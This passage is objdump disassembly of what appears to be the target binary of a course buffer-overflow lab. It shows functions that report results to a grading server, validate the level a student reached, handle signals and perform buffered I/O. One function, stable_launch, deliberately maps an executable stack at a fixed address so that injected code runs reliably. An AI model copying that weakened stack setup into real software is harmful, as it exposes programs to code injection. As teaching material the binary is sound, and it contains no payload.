  401b6b:	b8 00 00 00 00       	mov    $0x0,%eax
  401b70:	e8 6e ff ff ff       	callq  401ae3 <save_term>
  401b75:	4c 89 e0             	mov    %r12,%rax
  401b78:	5b                   	pop    %rbx
  401b79:	5d                   	pop    %rbp
  401b7a:	41 5c                	pop    %r12
  401b7c:	c3                   	retq   

0000000000401b7d <notify_server>:
  401b7d:	55                   	push   %rbp
  401b7e:	53                   	push   %rbx
  401b7f:	48 81 ec 18 40 00 00 	sub    $0x4018,%rsp
  401b86:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401b8d:	00 00 
  401b8f:	48 89 84 24 08 40 00 	mov    %rax,0x4008(%rsp)
  401b96:	00 
  401b97:	31 c0                	xor    %eax,%eax
  401b99:	83 3d 68 29 20 00 00 	cmpl   $0x0,0x202968(%rip)        # 604508 <is_checker>
  401ba0:	0f 85 c9 00 00 00    	jne    401c6f <notify_server+0xf2>
  401ba6:	89 fb                	mov    %edi,%ebx
  401ba8:	8b 05 76 35 20 00    	mov    0x203576(%rip),%eax        # 605124 <gets_cnt>
  401bae:	83 c0 64             	add    $0x64,%eax
  401bb1:	3d 00 20 00 00       	cmp    $0x2000,%eax
  401bb6:	0f 8f d4 00 00 00    	jg     401c90 <notify_server+0x113>
  401bbc:	0f be 05 65 35 20 00 	movsbl 0x203565(%rip),%eax        # 605128 <target_prefix>
  401bc3:	83 3d be 28 20 00 00 	cmpl   $0x0,0x2028be(%rip)        # 604488 <notify>
  401bca:	0f 84 de 00 00 00    	je     401cae <notify_server+0x131>
  401bd0:	8b 15 2a 29 20 00    	mov    0x20292a(%rip),%edx        # 604500 <authkey>
  401bd6:	85 db                	test   %ebx,%ebx
  401bd8:	0f 84 da 00 00 00    	je     401cb8 <notify_server+0x13b>
  401bde:	bd f9 32 40 00       	mov    $0x4032f9,%ebp
  401be3:	68 20 45 60 00       	pushq  $0x604520
  401be8:	56                   	push   %rsi
  401be9:	50                   	push   %rax
  401bea:	52                   	push   %rdx
  401beb:	49 89 e9             	mov    %rbp,%r9
  401bee:	44 8b 05 53 25 20 00 	mov    0x202553(%rip),%r8d        # 604148 <target_id>
  401bf5:	b9 03 33 40 00       	mov    $0x403303,%ecx
  401bfa:	ba 00 20 00 00       	mov    $0x2000,%edx
  401bff:	be 01 00 00 00       	mov    $0x1,%esi
  401c04:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
  401c09:	b8 00 00 00 00       	mov    $0x0,%eax
  401c0e:	e8 4d f2 ff ff       	callq  400e60 <__sprintf_chk@plt>
  401c13:	48 83 c4 20          	add    $0x20,%rsp
  401c17:	83 3d 6a 28 20 00 00 	cmpl   $0x0,0x20286a(%rip)        # 604488 <notify>
  401c1e:	0f 84 d3 00 00 00    	je     401cf7 <notify_server+0x17a>
  401c24:	85 db                	test   %ebx,%ebx
  401c26:	0f 84 bc 00 00 00    	je     401ce8 <notify_server+0x16b>
  401c2c:	4c 8d 8c 24 00 20 00 	lea    0x2000(%rsp),%r9
  401c33:	00 
  401c34:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  401c3a:	48 89 e1             	mov    %rsp,%rcx
  401c3d:	48 8b 15 0c 25 20 00 	mov    0x20250c(%rip),%rdx        # 604150 <lab>
  401c44:	48 8b 35 0d 25 20 00 	mov    0x20250d(%rip),%rsi        # 604158 <course>
  401c4b:	48 8b 3d ee 24 20 00 	mov    0x2024ee(%rip),%rdi        # 604140 <user_id>
  401c52:	e8 31 11 00 00       	callq  402d88 <driver_post>
  401c57:	85 c0                	test   %eax,%eax
  401c59:	78 67                	js     401cc2 <notify_server+0x145>
  401c5b:	bf 48 34 40 00       	mov    $0x403448,%edi
  401c60:	e8 5b f0 ff ff       	callq  400cc0 <puts@plt>
  401c65:	bf 2b 33 40 00       	mov    $0x40332b,%edi
  401c6a:	e8 51 f0 ff ff       	callq  400cc0 <puts@plt>
  401c6f:	48 8b 84 24 08 40 00 	mov    0x4008(%rsp),%rax
  401c76:	00 
  401c77:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  401c7e:	00 00 
  401c80:	0f 85 f5 00 00 00    	jne    401d7b <notify_server+0x1fe>
  401c86:	48 81 c4 18 40 00 00 	add    $0x4018,%rsp
  401c8d:	5b                   	pop    %rbx
  401c8e:	5d                   	pop    %rbp
  401c8f:	c3                   	retq   
  401c90:	be 18 34 40 00       	mov    $0x403418,%esi
  401c95:	bf 01 00 00 00       	mov    $0x1,%edi
  401c9a:	b8 00 00 00 00       	mov    $0x0,%eax
  401c9f:	e8 3c f1 ff ff       	callq  400de0 <__printf_chk@plt>
  401ca4:	bf 01 00 00 00       	mov    $0x1,%edi
  401ca9:	e8 82 f1 ff ff       	callq  400e30 <exit@plt>
  401cae:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  401cb3:	e9 1e ff ff ff       	jmpq   401bd6 <notify_server+0x59>
  401cb8:	bd fe 32 40 00       	mov    $0x4032fe,%ebp
  401cbd:	e9 21 ff ff ff       	jmpq   401be3 <notify_server+0x66>
  401cc2:	48 8d 94 24 00 20 00 	lea    0x2000(%rsp),%rdx
  401cc9:	00 
  401cca:	be 1f 33 40 00       	mov    $0x40331f,%esi
  401ccf:	bf 01 00 00 00       	mov    $0x1,%edi
  401cd4:	b8 00 00 00 00       	mov    $0x0,%eax
  401cd9:	e8 02 f1 ff ff       	callq  400de0 <__printf_chk@plt>
  401cde:	bf 01 00 00 00       	mov    $0x1,%edi
  401ce3:	e8 48 f1 ff ff       	callq  400e30 <exit@plt>
  401ce8:	bf 35 33 40 00       	mov    $0x403335,%edi
  401ced:	e8 ce ef ff ff       	callq  400cc0 <puts@plt>
  401cf2:	e9 78 ff ff ff       	jmpq   401c6f <notify_server+0xf2>
  401cf7:	48 89 ea             	mov    %rbp,%rdx
  401cfa:	be 80 34 40 00       	mov    $0x403480,%esi
  401cff:	bf 01 00 00 00       	mov    $0x1,%edi
  401d04:	b8 00 00 00 00       	mov    $0x0,%eax
  401d09:	e8 d2 f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401d0e:	48 8b 15 2b 24 20 00 	mov    0x20242b(%rip),%rdx        # 604140 <user_id>
  401d15:	be 3c 33 40 00       	mov    $0x40333c,%esi
  401d1a:	bf 01 00 00 00       	mov    $0x1,%edi
  401d1f:	b8 00 00 00 00       	mov    $0x0,%eax
  401d24:	e8 b7 f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401d29:	48 8b 15 28 24 20 00 	mov    0x202428(%rip),%rdx        # 604158 <course>
  401d30:	be 49 33 40 00       	mov    $0x403349,%esi
  401d35:	bf 01 00 00 00       	mov    $0x1,%edi
  401d3a:	b8 00 00 00 00       	mov    $0x0,%eax
  401d3f:	e8 9c f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401d44:	48 8b 15 05 24 20 00 	mov    0x202405(%rip),%rdx        # 604150 <lab>
  401d4b:	be 55 33 40 00       	mov    $0x403355,%esi
  401d50:	bf 01 00 00 00       	mov    $0x1,%edi
  401d55:	b8 00 00 00 00       	mov    $0x0,%eax
  401d5a:	e8 81 f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401d5f:	48 89 e2             	mov    %rsp,%rdx
  401d62:	be 5e 33 40 00       	mov    $0x40335e,%esi
  401d67:	bf 01 00 00 00       	mov    $0x1,%edi
  401d6c:	b8 00 00 00 00       	mov    $0x0,%eax
  401d71:	e8 6a f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401d76:	e9 f4 fe ff ff       	jmpq   401c6f <notify_server+0xf2>
  401d7b:	e8 60 ef ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000401d80 <validate>:
  401d80:	53                   	push   %rbx
  401d81:	89 fb                	mov    %edi,%ebx
  401d83:	83 3d 7e 27 20 00 00 	cmpl   $0x0,0x20277e(%rip)        # 604508 <is_checker>
  401d8a:	74 6b                	je     401df7 <validate+0x77>
  401d8c:	39 3d 6a 27 20 00    	cmp    %edi,0x20276a(%rip)        # 6044fc <vlevel>
  401d92:	75 2f                	jne    401dc3 <validate+0x43>
  401d94:	8b 15 5e 27 20 00    	mov    0x20275e(%rip),%edx        # 6044f8 <check_level>
  401d9a:	39 fa                	cmp    %edi,%edx
  401d9c:	75 39                	jne    401dd7 <validate+0x57>
  401d9e:	0f be 15 83 33 20 00 	movsbl 0x203383(%rip),%edx        # 605128 <target_prefix>
  401da5:	41 b8 20 45 60 00    	mov    $0x604520,%r8d
  401dab:	89 f9                	mov    %edi,%ecx
  401dad:	be 88 33 40 00       	mov    $0x403388,%esi
  401db2:	bf 01 00 00 00       	mov    $0x1,%edi
  401db7:	b8 00 00 00 00       	mov    $0x0,%eax
  401dbc:	e8 1f f0 ff ff       	callq  400de0 <__printf_chk@plt>
  401dc1:	5b                   	pop    %rbx
  401dc2:	c3                   	retq   
  401dc3:	bf 6a 33 40 00       	mov    $0x40336a,%edi
  401dc8:	e8 f3 ee ff ff       	callq  400cc0 <puts@plt>
  401dcd:	b8 00 00 00 00       	mov    $0x0,%eax
  401dd2:	e8 1f fd ff ff       	callq  401af6 <check_fail>
  401dd7:	89 f9                	mov    %edi,%ecx
  401dd9:	be a8 34 40 00       	mov    $0x4034a8,%esi
  401dde:	bf 01 00 00 00       	mov    $0x1,%edi
  401de3:	b8 00 00 00 00       	mov    $0x0,%eax
  401de8:	e8 f3 ef ff ff       	callq  400de0 <__printf_chk@plt>
  401ded:	b8 00 00 00 00       	mov    $0x0,%eax
  401df2:	e8 ff fc ff ff       	callq  401af6 <check_fail>
  401df7:	39 3d ff 26 20 00    	cmp    %edi,0x2026ff(%rip)        # 6044fc <vlevel>
  401dfd:	74 18                	je     401e17 <validate+0x97>
  401dff:	bf 6a 33 40 00       	mov    $0x40336a,%edi
  401e04:	e8 b7 ee ff ff       	callq  400cc0 <puts@plt>
  401e09:	89 de                	mov    %ebx,%esi
  401e0b:	bf 00 00 00 00       	mov    $0x0,%edi
  401e10:	e8 68 fd ff ff       	callq  401b7d <notify_server>
  401e15:	eb aa                	jmp    401dc1 <validate+0x41>
  401e17:	0f be 0d 0a 33 20 00 	movsbl 0x20330a(%rip),%ecx        # 605128 <target_prefix>
  401e1e:	89 fa                	mov    %edi,%edx
  401e20:	be d0 34 40 00       	mov    $0x4034d0,%esi
  401e25:	bf 01 00 00 00       	mov    $0x1,%edi
  401e2a:	b8 00 00 00 00       	mov    $0x0,%eax
  401e2f:	e8 ac ef ff ff       	callq  400de0 <__printf_chk@plt>
  401e34:	89 de                	mov    %ebx,%esi
  401e36:	bf 01 00 00 00       	mov    $0x1,%edi
  401e3b:	e8 3d fd ff ff       	callq  401b7d <notify_server>
  401e40:	e9 7c ff ff ff       	jmpq   401dc1 <validate+0x41>

0000000000401e45 <fail>:
  401e45:	48 83 ec 08          	sub    $0x8,%rsp
  401e49:	83 3d b8 26 20 00 00 	cmpl   $0x0,0x2026b8(%rip)        # 604508 <is_checker>
  401e50:	75 11                	jne    401e63 <fail+0x1e>
  401e52:	89 fe                	mov    %edi,%esi
  401e54:	bf 00 00 00 00       	mov    $0x0,%edi
  401e59:	e8 1f fd ff ff       	callq  401b7d <notify_server>
  401e5e:	48 83 c4 08          	add    $0x8,%rsp
  401e62:	c3                   	retq   
  401e63:	b8 00 00 00 00       	mov    $0x0,%eax
  401e68:	e8 89 fc ff ff       	callq  401af6 <check_fail>

0000000000401e6d <bushandler>:
  401e6d:	48 83 ec 08          	sub    $0x8,%rsp
  401e71:	83 3d 90 26 20 00 00 	cmpl   $0x0,0x202690(%rip)        # 604508 <is_checker>
  401e78:	74 14                	je     401e8e <bushandler+0x21>
  401e7a:	bf 9d 33 40 00       	mov    $0x40339d,%edi
  401e7f:	e8 3c ee ff ff       	callq  400cc0 <puts@plt>
  401e84:	b8 00 00 00 00       	mov    $0x0,%eax
  401e89:	e8 68 fc ff ff       	callq  401af6 <check_fail>
  401e8e:	bf 08 35 40 00       	mov    $0x403508,%edi
  401e93:	e8 28 ee ff ff       	callq  400cc0 <puts@plt>
  401e98:	bf a7 33 40 00       	mov    $0x4033a7,%edi
  401e9d:	e8 1e ee ff ff       	callq  400cc0 <puts@plt>
  401ea2:	be 00 00 00 00       	mov    $0x0,%esi
  401ea7:	bf 00 00 00 00       	mov    $0x0,%edi
  401eac:	e8 cc fc ff ff       	callq  401b7d <notify_server>
  401eb1:	bf 01 00 00 00       	mov    $0x1,%edi
  401eb6:	e8 75 ef ff ff       	callq  400e30 <exit@plt>

0000000000401ebb <seghandler>:
  401ebb:	48 83 ec 08          	sub    $0x8,%rsp
  401ebf:	83 3d 42 26 20 00 00 	cmpl   $0x0,0x202642(%rip)        # 604508 <is_checker>
  401ec6:	74 14                	je     401edc <seghandler+0x21>
  401ec8:	bf bd 33 40 00       	mov    $0x4033bd,%edi
  401ecd:	e8 ee ed ff ff       	callq  400cc0 <puts@plt>
  401ed2:	b8 00 00 00 00       	mov    $0x0,%eax
  401ed7:	e8 1a fc ff ff       	callq  401af6 <check_fail>
  401edc:	bf 28 35 40 00       	mov    $0x403528,%edi
  401ee1:	e8 da ed ff ff       	callq  400cc0 <puts@plt>
  401ee6:	bf a7 33 40 00       	mov    $0x4033a7,%edi
  401eeb:	e8 d0 ed ff ff       	callq  400cc0 <puts@plt>
  401ef0:	be 00 00 00 00       	mov    $0x0,%esi
  401ef5:	bf 00 00 00 00       	mov    $0x0,%edi
  401efa:	e8 7e fc ff ff       	callq  401b7d <notify_server>
  401eff:	bf 01 00 00 00       	mov    $0x1,%edi
  401f04:	e8 27 ef ff ff       	callq  400e30 <exit@plt>

0000000000401f09 <illegalhandler>:
  401f09:	48 83 ec 08          	sub    $0x8,%rsp
  401f0d:	83 3d f4 25 20 00 00 	cmpl   $0x0,0x2025f4(%rip)        # 604508 <is_checker>
  401f14:	74 14                	je     401f2a <illegalhandler+0x21>
  401f16:	bf d0 33 40 00       	mov    $0x4033d0,%edi
  401f1b:	e8 a0 ed ff ff       	callq  400cc0 <puts@plt>
  401f20:	b8 00 00 00 00       	mov    $0x0,%eax
  401f25:	e8 cc fb ff ff       	callq  401af6 <check_fail>
  401f2a:	bf 50 35 40 00       	mov    $0x403550,%edi
  401f2f:	e8 8c ed ff ff       	callq  400cc0 <puts@plt>
  401f34:	bf a7 33 40 00       	mov    $0x4033a7,%edi
  401f39:	e8 82 ed ff ff       	callq  400cc0 <puts@plt>
  401f3e:	be 00 00 00 00       	mov    $0x0,%esi
  401f43:	bf 00 00 00 00       	mov    $0x0,%edi
  401f48:	e8 30 fc ff ff       	callq  401b7d <notify_server>
  401f4d:	bf 01 00 00 00       	mov    $0x1,%edi
  401f52:	e8 d9 ee ff ff       	callq  400e30 <exit@plt>

0000000000401f57 <sigalrmhandler>:
  401f57:	48 83 ec 08          	sub    $0x8,%rsp
  401f5b:	83 3d a6 25 20 00 00 	cmpl   $0x0,0x2025a6(%rip)        # 604508 <is_checker>
  401f62:	74 14                	je     401f78 <sigalrmhandler+0x21>
  401f64:	bf e4 33 40 00       	mov    $0x4033e4,%edi
  401f69:	e8 52 ed ff ff       	callq  400cc0 <puts@plt>
  401f6e:	b8 00 00 00 00       	mov    $0x0,%eax
  401f73:	e8 7e fb ff ff       	callq  401af6 <check_fail>
  401f78:	ba 05 00 00 00       	mov    $0x5,%edx
  401f7d:	be 80 35 40 00       	mov    $0x403580,%esi
  401f82:	bf 01 00 00 00       	mov    $0x1,%edi
  401f87:	b8 00 00 00 00       	mov    $0x0,%eax
  401f8c:	e8 4f ee ff ff       	callq  400de0 <__printf_chk@plt>
  401f91:	be 00 00 00 00       	mov    $0x0,%esi
  401f96:	bf 00 00 00 00       	mov    $0x0,%edi
  401f9b:	e8 dd fb ff ff       	callq  401b7d <notify_server>
  401fa0:	bf 01 00 00 00       	mov    $0x1,%edi
  401fa5:	e8 86 ee ff ff       	callq  400e30 <exit@plt>

0000000000401faa <launch>:
  401faa:	55                   	push   %rbp
  401fab:	48 89 e5             	mov    %rsp,%rbp
  401fae:	48 83 ec 10          	sub    $0x10,%rsp
  401fb2:	48 89 fa             	mov    %rdi,%rdx
  401fb5:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401fbc:	00 00 
  401fbe:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401fc2:	31 c0                	xor    %eax,%eax
  401fc4:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
  401fc8:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401fcc:	48 29 c4             	sub    %rax,%rsp
  401fcf:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
  401fd4:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
  401fd8:	be f4 00 00 00       	mov    $0xf4,%esi
  401fdd:	e8 1e ed ff ff       	callq  400d00 <memset@plt>
  401fe2:	48 8b 05 b7 24 20 00 	mov    0x2024b7(%rip),%rax        # 6044a0 <stdin@@GLIBC_2.2.5>
  401fe9:	48 39 05 00 25 20 00 	cmp    %rax,0x202500(%rip)        # 6044f0 <infile>
  401ff0:	74 38                	je     40202a <launch+0x80>
  401ff2:	c7 05 00 25 20 00 00 	movl   $0x0,0x202500(%rip)        # 6044fc <vlevel>
  401ff9:	00 00 00 
  401ffc:	b8 00 00 00 00       	mov    $0x0,%eax
  402001:	e8 5c fa ff ff       	callq  401a62 <test>
  402006:	83 3d fb 24 20 00 00 	cmpl   $0x0,0x2024fb(%rip)        # 604508 <is_checker>
  40200d:	75 31                	jne    402040 <launch+0x96>
  40200f:	bf 04 34 40 00       	mov    $0x403404,%edi
  402014:	e8 a7 ec ff ff       	callq  400cc0 <puts@plt>
  402019:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40201d:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  402024:	00 00 
  402026:	75 2c                	jne    402054 <launch+0xaa>
  402028:	c9                   	leaveq 
  402029:	c3                   	retq   
  40202a:	be ec 33 40 00       	mov    $0x4033ec,%esi
  40202f:	bf 01 00 00 00       	mov    $0x1,%edi
  402034:	b8 00 00 00 00       	mov    $0x0,%eax
  402039:	e8 a2 ed ff ff       	callq  400de0 <__printf_chk@plt>
  40203e:	eb b2                	jmp    401ff2 <launch+0x48>
  402040:	bf f9 33 40 00       	mov    $0x4033f9,%edi
  402045:	e8 76 ec ff ff       	callq  400cc0 <puts@plt>
  40204a:	b8 00 00 00 00       	mov    $0x0,%eax
  40204f:	e8 a2 fa ff ff       	callq  401af6 <check_fail>
  402054:	e8 87 ec ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000402059 <stable_launch>:
  402059:	53                   	push   %rbx
  40205a:	48 89 3d 87 24 20 00 	mov    %rdi,0x202487(%rip)        # 6044e8 <global_offset>
  402061:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  402067:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  40206d:	b9 32 01 00 00       	mov    $0x132,%ecx
  402072:	ba 07 00 00 00       	mov    $0x7,%edx
  402077:	be 00 00 10 00       	mov    $0x100000,%esi
  40207c:	bf 00 60 58 55       	mov    $0x55586000,%edi
  402081:	e8 6a ec ff ff       	callq  400cf0 <mmap@plt>
  402086:	48 89 c3             	mov    %rax,%rbx
  402089:	48 3d 00 60 58 55    	cmp    $0x55586000,%rax
  40208f:	75 43                	jne    4020d4 <stable_launch+0x7b>
  402091:	48 8d 90 f8 ff 0f 00 	lea    0xffff8(%rax),%rdx
  402098:	48 89 15 91 30 20 00 	mov    %rdx,0x203091(%rip)        # 605130 <stack_top>
  40209f:	48 89 e0             	mov    %rsp,%rax
  4020a2:	48 89 d4             	mov    %rdx,%rsp
  4020a5:	48 89 c2             	mov    %rax,%rdx
  4020a8:	48 89 15 31 24 20 00 	mov    %rdx,0x202431(%rip)        # 6044e0 <global_save_stack>
  4020af:	48 8b 3d 32 24 20 00 	mov    0x202432(%rip),%rdi        # 6044e8 <global_offset>
  4020b6:	e8 ef fe ff ff       	callq  401faa <launch>
  4020bb:	48 8b 05 1e 24 20 00 	mov    0x20241e(%rip),%rax        # 6044e0 <global_save_stack>
  4020c2:	48 89 c4             	mov    %rax,%rsp
  4020c5:	be 00 00 10 00       	mov    $0x100000,%esi
  4020ca:	48 89 df             	mov    %rbx,%rdi
  4020cd:	e8 fe ec ff ff       	callq  400dd0 <munmap@plt>
  4020d2:	5b                   	pop    %rbx
  4020d3:	c3                   	retq   
  4020d4:	be 00 00 10 00       	mov    $0x100000,%esi
  4020d9:	48 89 c7             	mov    %rax,%rdi
  4020dc:	e8 ef ec ff ff       	callq  400dd0 <munmap@plt>
  4020e1:	b9 00 60 58 55       	mov    $0x55586000,%ecx
  4020e6:	ba b8 35 40 00       	mov    $0x4035b8,%edx
  4020eb:	be 01 00 00 00       	mov    $0x1,%esi
  4020f0:	48 8b 3d c9 23 20 00 	mov    0x2023c9(%rip),%rdi        # 6044c0 <stderr@@GLIBC_2.2.5>
  4020f7:	b8 00 00 00 00       	mov    $0x0,%eax
  4020fc:	e8 4f ed ff ff       	callq  400e50 <__fprintf_chk@plt>
  402101:	bf 01 00 00 00       	mov    $0x1,%edi
  402106:	e8 25 ed ff ff       	callq  400e30 <exit@plt>

000000000040210b <rio_readinitb>:
  40210b:	89 37                	mov    %esi,(%rdi)
  40210d:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%rdi)
  402114:	48 8d 47 10          	lea    0x10(%rdi),%rax
  402118:	48 89 47 08          	mov    %rax,0x8(%rdi)
  40211c:	c3                   	retq   

000000000040211d <sigalrm_handler>:
  40211d:	48 83 ec 08          	sub    $0x8,%rsp
  402121:	b9 00 00 00 00       	mov    $0x0,%ecx
  402126:	ba f0 35 40 00       	mov    $0x4035f0,%edx
  40212b:	be 01 00 00 00       	mov    $0x1,%esi
  402130:	48 8b 3d 89 23 20 00 	mov    0x202389(%rip),%rdi        # 6044c0 <stderr@@GLIBC_2.2.5>
  402137:	b8 00 00 00 00       	mov    $0x0,%eax
  40213c:	e8 0f ed ff ff       	callq  400e50 <__fprintf_chk@plt>
  402141:	bf 01 00 00 00       	mov    $0x1,%edi
  402146:	e8 e5 ec ff ff       	callq  400e30 <exit@plt>

000000000040214b <rio_writen>:
  40214b:	41 55                	push   %r13
  40214d:	41 54                	push   %r12
  40214f:	55                   	push   %rbp
  402150:	53                   	push   %rbx
  402151:	48 83 ec 08          	sub    $0x8,%rsp
  402155:	41 89 fc             	mov    %edi,%r12d
  402158:	48 89 f5             	mov    %rsi,%rbp
  40215b:	49 89 d5             	mov    %rdx,%r13
  40215e:	48 89 d3             	mov    %rdx,%rbx
  402161:	eb 06                	jmp    402169 <rio_writen+0x1e>
  402163:	48 29 c3             	sub    %rax,%rbx
  402166:	48 01 c5             	add    %rax,%rbp
  402169:	48 85 db             	test   %rbx,%rbx
  40216c:	74 24                	je     402192 <rio_writen+0x47>
  40216e:	48 89 da             	mov    %rbx,%rdx
  402171:	48 89 ee             	mov    %rbp,%rsi
  402174:	44 89 e7             	mov    %r12d,%edi
  402177:	e8 54 eb ff ff       	callq  400cd0 <write@plt>
  40217c:	48 85 c0             	test   %rax,%rax
  40217f:	7f e2                	jg     402163 <rio_writen+0x18>
  402181:	e8 fa ea ff ff       	callq  400c80 <__errno_location@plt>
  402186:	83 38 04             	cmpl   $0x4,(%rax)
  402189:	75 15                	jne    4021a0 <rio_writen+0x55>
  40218b:	b8 00 00 00 00       	mov    $0x0,%eax
  402190:	eb d1                	jmp    402163 <rio_writen+0x18>
  402192:	4c 89 e8             	mov    %r13,%rax
  402195:	48 83 c4 08          	add    $0x8,%rsp
  402199:	5b                   	pop    %rbx
  40219a:	5d                   	pop    %rbp
  40219b:	41 5c                	pop    %r12
  40219d:	41 5d                	pop    %r13
  40219f:	c3                   	retq   
  4021a0:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  4021a7:	eb ec                	jmp    402195 <rio_writen+0x4a>

00000000004021a9 <rio_read>:
  4021a9:	41 55                	push   %r13
  4021ab:	41 54                	push   %r12
  4021ad:	55                   	push   %rbp
  4021ae:	53                   	push   %rbx
  4021af:	48 83 ec 08          	sub    $0x8,%rsp
  4021b3:	48 89 fb             	mov    %rdi,%rbx
  4021b6:	49 89 f5             	mov    %rsi,%r13
  4021b9:	49 89 d4             	mov    %rdx,%r12
  4021bc:	eb 0a                	jmp    4021c8 <rio_read+0x1f>
  4021be:	e8 bd ea ff ff       	callq  400c80 <__errno_location@plt>
  4021c3:	83 38 04             	cmpl   $0x4,(%rax)
  4021c6:	75 5c                	jne    402224 <rio_read+0x7b>
  4021c8:	8b 6b 04             	mov    0x4(%rbx),%ebp
  4021cb:	85 ed                	test   %ebp,%ebp
  4021cd:	7f 24                	jg     4021f3 <rio_read+0x4a>
  4021cf:	48 8d 6b 10          	lea    0x10(%rbx),%rbp
  4021d3:	8b 3b                	mov    (%rbx),%edi
  4021d5:	ba 00 20 00 00       	mov    $0x2000,%edx
  4021da:	48 89 ee             	mov    %rbp,%rsi
  4021dd:	e8 4e eb ff ff       	callq  400d30 <read@plt>
  4021e2:	89 43 04             	mov    %eax,0x4(%rbx)
  4021e5:	85 c0                	test   %eax,%eax
  4021e7:	78 d5                	js     4021be <rio_read+0x15>
  4021e9:	85 c0                	test   %eax,%eax
  4021eb:	74 40                	je     40222d <rio_read+0x84>
  4021ed:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
  4021f1:	eb d5                	jmp    4021c8 <rio_read+0x1f>
  4021f3:	89 e8                	mov    %ebp,%eax
  4021f5:	4c 39 e0             	cmp    %r12,%rax
  4021f8:	72 03                	jb     4021fd <rio_read+0x54>
  4021fa:	44 89 e5             	mov    %r12d,%ebp
  4021fd:	4c 63 e5             	movslq %ebp,%r12
  402200:	48 8b 73 08          	mov    0x8(%rbx),%rsi
  402204:	4c 89 e2             	mov    %r12,%rdx
  402207:	4c 89 ef             	mov    %r13,%rdi
  40220a:	e8 71 eb ff ff       	callq  400d80 <memcpy@plt>
  40220f:	4c 01 63 08          	add    %r12,0x8(%rbx)
  402213:	29 6b 04             	sub    %ebp,0x4(%rbx)
  402216:	4c 89 e0             	mov    %r12,%rax
  402219:	48 83 c4 08          	add    $0x8,%rsp
  40221d:	5b                   	pop    %rbx
  40221e:	5d                   	pop    %rbp
  40221f:	41 5c                	pop    %r12
  402221:	41 5d                	pop    %r13
  402223:	c3                   	retq   
  402224:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  40222b:	eb ec                	jmp    402219 <rio_read+0x70>
  40222d:	b8 00 00 00 00       	mov    $0x0,%eax
  402232:	eb e5                	jmp    402219 <rio_read+0x70>

0000000000402234 <rio_readlineb>:
  402234:	41 55                	push   %r13
  402236:	41 54                	push   %r12
  402238:	55                   	push   %rbp
  402239:	53                   	push   %rbx
  40223a:	48 83 ec 18          	sub    $0x18,%rsp
  40223e:	49 89 fd             	mov    %rdi,%r13
  402241:	48 89 f5             	mov    %rsi,%rbp
  402244:	49 89 d4             	mov    %rdx,%r12
  402247:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40224e:	00 00 
  402250:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  402255:	31 c0                	xor    %eax,%eax
  402257:	bb 01 00 00 00       	mov    $0x1,%ebx
  40225c:	4c 39 e3             	cmp    %r12,%rbx
  40225f:	73 47                	jae    4022a8 <rio_readlineb+0x74>
  402261:	ba 01 00 00 00       	mov    $0x1,%edx
  402266:	48 8d 74 24 07       	lea    0x7(%rsp),%rsi
  40226b:	4c 89 ef             	mov    %r13,%rdi
  40226e:	e8 36 ff ff ff       	callq  4021a9 <rio_read>
  402273:	83 f8 01             	cmp    $0x1,%eax
  402276:	75 1c                	jne    402294 <rio_readlineb+0x60>
  402278:	48 8d 45 01          	lea    0x1(%rbp),%rax
  40227c:	0f b6 54 24 07       	movzbl 0x7(%rsp),%edx
  402281:	88 55 00             	mov    %dl,0x0(%rbp)
  402284:	80 7c 24 07 0a       	cmpb   $0xa,0x7(%rsp)
  402289:	74 1a                	je     4022a5 <rio_readlineb+0x71>
  40228b:	48 83 c3 01          	add    $0x1,%rbx
  40228f:	48 89 c5             	mov    %rax,%rbp
  402292:	eb c8                	jmp    40225c <rio_readlineb+0x28>
  402294:	85 c0                	test   %eax,%eax
  402296:	75 32                	jne    4022ca <rio_readlineb+0x96>
  402298:	48 83 fb 01          	cmp    $0x1,%rbx
  40229c:	75 0a                	jne    4022a8 <rio_readlineb+0x74>
  40229e:	b8 00 00 00 00       	mov    $0x0,%eax
  4022a3:	eb 0a                	jmp    4022af <rio_readlineb+0x7b>
  4022a5:	48 89 c5             	mov    %rax,%rbp
  4022a8:	c6 45 00 00          	movb   $0x0,0x0(%rbp)
  4022ac:	48 89 d8             	mov    %rbx,%rax
  4022af:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  4022b4:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
  4022bb:	00 00 
  4022bd:	75 14                	jne    4022d3 <rio_readlineb+0x9f>
  4022bf:	48 83 c4 18          	add    $0x18,%rsp
  4022c3:	5b                   	pop    %rbx
  4022c4:	5d                   	pop    %rbp
  4022c5:	41 5c                	pop    %r12
  4022c7:	41 5d                	pop    %r13
  4022c9:	c3                   	retq   
  4022ca:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  4022d1:	eb dc                	jmp    4022af <rio_readlineb+0x7b>
  4022d3:	e8 08 ea ff ff       	callq  400ce0 <__stack_chk_fail@plt>

00000000004022d8 <urlencode>:
  4022d8:	41 54                	push   %r12
  4022da:	55                   	push   %rbp
  4022db:	53                   	push   %rbx
  4022dc:	48 83 ec 10          	sub    $0x10,%rsp
